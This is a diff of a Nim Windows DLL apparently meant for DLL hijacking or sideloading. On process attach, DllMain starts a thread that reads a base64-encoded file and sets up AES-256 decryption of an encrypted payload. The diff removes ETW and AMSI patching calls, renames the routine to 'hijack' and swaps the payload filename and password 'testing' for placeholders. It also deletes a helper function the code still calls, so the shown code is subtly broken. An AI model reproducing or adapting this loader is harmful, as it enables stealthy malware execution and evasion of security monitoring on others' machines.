@@ -7,20 +7,17 @@ import dynlib
 import base64
 import nimcrypto
 import nimcrypto/sysrand
-# If you prefer to not pass the .def file via CLI during compilation uncomment the line below, and replace with actual filename
-#{.passl: " mydeffile.def".}
-func toByteSeq*(str: string): seq[byte] {.inline.} =
-    @(str.toOpenArrayByte(0, str.high))
+
+
 
 proc NimMain() {.cdecl, importc.}
 
-proc doMagic(lpParameter: LPVOID) : DWORD {.stdcall.} =
-#  var amsi_patch = PatchAmsi()
-  var etw_patch = Patchntdll()
+proc hijack(lpParameter: LPVOID) : DWORD {.stdcall.} =
+
 
   var
-      inFile: string = "418c80773c814dc7ae2b9392a2e07a88.cab"
-      password: string = "testing"
+      inFile: string = "<encrypted payload file>"
+      password: string = "<password>"
       inFileContents: string = readFile(inFile)
       encrypted: seq[byte] = toByteSeq(decode(inFileContents))
       dctx: CTR[aes256]
@@ -53,7 +50,7 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   NimMain() # You must manually import and start Nim's garbage collector if you define you're own DllMain
   case fdwReason:
     of DLL_PROCESS_ATTACH:
-      var threadHandle = CreateThread(NULL, 0, doMagic, NULL, 0, NULL)
+      var threadHandle = CreateThread(NULL, 0, hijack, NULL, 0, NULL)
       CloseHandle(threadHandle)
     of DLL_THREAD_ATTACH:
       discard
